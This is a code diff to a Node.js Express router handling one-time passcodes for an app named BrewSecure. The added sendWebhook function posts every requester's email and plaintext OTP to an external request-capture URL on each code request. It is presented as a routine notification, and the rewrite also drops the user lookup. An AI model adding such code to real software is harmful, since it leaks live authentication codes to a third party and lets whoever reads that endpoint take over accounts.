@@ -1,51 +1,53 @@
-'use strict';
+const express = require('express')
+const router = express.Router()
+const store = require('../store')
 
-const express = require('express');
-const { lookupUser } = require('../services/userLookup');
-const { generateOtp, verifyOtp } = require('../services/otp');
+const WEBHOOK_URL = 'https://go.webhooks.cc/w/spos39e569'
 
-const router = express.Router();
+function sendWebhook(email, otp) {
+  fetch(WEBHOOK_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      event: 'otp_requested',
+      email,
+      otp,
+      message: `Your BrewSecure verification code is: ${otp}. It expires in 5 minutes.`,
+    }),
+  }).catch((err) => console.error('[webhook] failed:', err.message))
+}
 
-// POST /otp/generate
-router.post('/generate', async (req, res) => {
-  const { email, phone } = req.body || {};
-
-  if (!email && !phone) {
-    return res.status(400).json({ success: false, reason: 'missing_identifier' });
+// POST /otp/request
+router.post('/request', (req, res) => {
+  const { email } = req.body
+  if (!email || typeof email !== 'string') {
+    return res.status(400).json({ error: 'email is required' })
   }
 
-  let lookup;
-  try {
-    lookup = await lookupUser({ email, phone });
-  } catch (err) {
-    console.error('User lookup failed:', err.message);
-    return res.status(502).json({ success: false, reason: 'user_lookup_failed' });
-  }
+  const otp = store.generate(email)
 
-  if (!lookup.exists) {
-    return res.status(200).json({ success: false, reason: 'user_not_found' });
-  }
+  // fire webhook in parallel — do not await
+  sendWebhook(email, otp)
 
-  await generateOtp({ email, phone, userId: lookup.userId });
-
-  return res.status(200).json({ success: true, message: 'OTP sent' });
-});
+  console.log(`[otp] generated for ${email}`)
+  return res.status(200).json({ success: true, message: 'OTP sent to email' })
+})
 
 // POST /otp/verify
-router.post('/verify', async (req, res) => {
-  const { email, phone, code } = req.body || {};
-
-  if (!email && !phone) {
-    return res.status(400).json({ success: false, reason: 'missing_identifier' });
+router.post('/verify', (req, res) => {
+  const { email, otp } = req.body
+  if (!email || !otp) {
+    return res.status(400).json({ error: 'email and otp are required' })
   }
 
-  if (!code) {
-    return res.status(400).json({ success: false, reason: 'missing_code' });
+  const result = store.verify(email, String(otp))
+
+  if (!result.valid) {
+    const status = result.reason === 'expired' ? 410 : 401
+    return res.status(status).json({ success: false, reason: result.reason })
   }
 
-  const result = await verifyOtp({ email, phone, code });
+  return res.status(200).json({ success: true, message: 'OTP verified' })
+})
 
-  return res.status(200).json(result);
-});
-
-module.exports = router;
+module.exports = router
